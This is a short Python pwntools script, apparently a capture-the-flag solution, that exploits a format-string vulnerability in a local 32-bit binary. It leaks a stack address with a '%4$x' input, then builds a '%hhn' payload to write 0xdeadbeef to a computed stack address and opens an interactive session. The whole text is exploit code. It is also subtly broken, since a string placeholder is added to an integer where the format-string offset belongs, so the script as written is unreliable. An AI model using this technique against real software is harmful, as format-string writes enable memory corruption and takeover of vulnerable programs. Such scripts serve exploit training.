#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='i386')
p = process("./vuln")

# -------------------------
# input1: leak base
# -------------------------
p.recvuntil(b"input1:\n")
p.sendline(b"AAAA.%4$x")
line = p.recvline().strip()

# line: b"AAAA.<hex>"
base_hex = line.split(b".")[1]
base = int(base_hex, 16)
log.success(f"base = {hex(base)}")

# target = base - 0x08  (because base = ebp-0x14, target = ebp-0x1c)
target = base - 0x08
log.success(f"target = {hex(target)}")

# -------------------------
# input2: write 0xdeadbeef
# -------------------------
p.recvuntil(b"input2:\n")

ARG_BASE = "fmt_buf_offset"
addrs = [target+i for i in range(4)]
want  = [0xef, 0xbe, 0xad, 0xde]

payload = b"".join(p32(a) for a in addrs)

printed = len(payload)  # bytes already emitted by printf (raw bytes count too)

for i, b in enumerate(want):
    pad = (b - (printed % 256)) % 256
    if pad == 0:
        pad = 256
    payload += f"%{pad}c%{ARG_BASE+i}$hhn".encode()
    printed += pad

p.sendline(payload)
p.interactive()
